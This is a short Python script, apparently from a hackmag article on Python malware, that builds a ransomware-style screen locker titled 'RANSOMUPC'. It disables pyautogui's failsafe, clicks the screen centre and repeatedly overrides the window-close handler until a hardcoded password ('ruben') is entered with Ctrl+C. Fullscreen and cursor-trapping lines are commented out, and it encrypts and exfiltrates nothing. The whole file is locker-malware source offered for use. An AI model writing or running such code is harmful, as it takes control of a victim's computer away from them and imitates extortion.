#https://hackmag.com/coding/python-malware/
import pyautogui
from tkinter import Tk,Entry,Label
from pyautogui import click, moveTo
from time import sleep


def callback(event):
    global k, entry
    if entry.get() == "ruben":
        k = True


def on_closing():
    #click(width/2, height/2)
    #moveTo(width/2, height/2)

    #root.attributes("-fullscreen", True)

    root.protocol("WM_DELETE_WINDOW", on_closing)
    root.update()

    root.bind('<Control-KeyPress-c>', callback)


root = Tk()

pyautogui.FAILSAFE = False

width = root.winfo_screenwidth()
height = root.winfo_screenheight()

root.title("RANSOMUPC")

root.geometry("600x250")

root.eval('tk::PlaceWindow . center')

entry = Entry(root, font=1)
entry.place(width=150, height=50,x=600/2-75,y=250/2-25)

label0 = Label(root, text="Locker", font=1)
label0.grid(row=0, column=0)
label1 = Label(root, text="Enter password and press Ctrl+C", font='Arial 20')
label1.place(x=600/2-75-130, y=250/2-25-100)

root.update()
sleep(0.2)

click(width/2, height/2)

k = False

while not k:
    on_closing()
